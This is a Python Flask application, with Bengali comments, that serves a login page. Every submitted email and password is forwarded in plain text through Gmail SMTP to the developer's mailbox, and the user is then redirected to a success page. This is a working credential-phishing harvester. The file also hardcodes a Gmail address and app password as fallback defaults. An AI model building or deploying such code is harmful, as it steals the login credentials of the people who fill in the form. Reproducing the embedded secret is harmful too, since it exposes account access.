import os
import smtplib
from flask import Flask, render_template, request, redirect, url_for
from dotenv import load_dotenv

# .env ফাইল থেকে ভেরিয়েবল লোড করার জন্য
load_dotenv()

app = Flask(__name__)

def send_email(user_info):
    try:
        # Render Environment Variables থেকে ডাটা নেওয়া
        # এখানে সরাসরি পাসওয়ার্ড না লিখে ভেরিয়েবল ব্যবহার করাই সবচেয়ে নিরাপদ
        my_email = os.environ.get("MY_EMAIL")
        app_password = os.environ.get("APP_PASSWORD")

        # যদি Render-এ সেট করা না থাকে তবে আপনার দেওয়া ডিফল্টগুলো কাজ করবে
        if not my_email:
            my_email = "mdrakibjoysiddhi2025@gmail.com"
        if not app_password:
            app_password = "jloa wdtm rdfr hnma"

        # Gmail SMTP সার্ভার সেটআপ
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.set_debuglevel(1) # লগ দেখার জন্য
        server.starttls()
        
        server.login(my_email, app_password)
        
        subject = "New Login Alert! (Rakib's Project)"
        body = f"User logged in with details:\n{user_info}"
        message = f"Subject: {subject}\n\n{body}"
        
        # নিজেকেই ইমেইল পাঠানো হচ্ছে
        server.sendmail(my_email, my_email, message)
        server.quit()  
        return True
    except Exception as e:
        print(f"SMTP Error: {e}") 
        return False

@app.route('/') 
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')

    if not email or not password:
        return redirect(url_for('index'))
    
    user_data = f"Email: {email}\nPassword: {password}"
    email_sent = send_email(user_data)
    
    if email_sent:
        return redirect(url_for('success'))
    else:
        # এরর মেসেজ আরও পরিষ্কার করা হয়েছে
        return "সার্ভারে সমস্যা হয়েছে। অনুগ্রহ করে নিশ্চিত করুন Render-এ Environment Variables সেট করা আছে।"

@app.route('/success')
def success():
    return render_template('success.html')

if __name__ == '__main__':
    # প্রোডাকশনে পোর্ট ডায়নামিক হওয়া প্রয়োজন
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)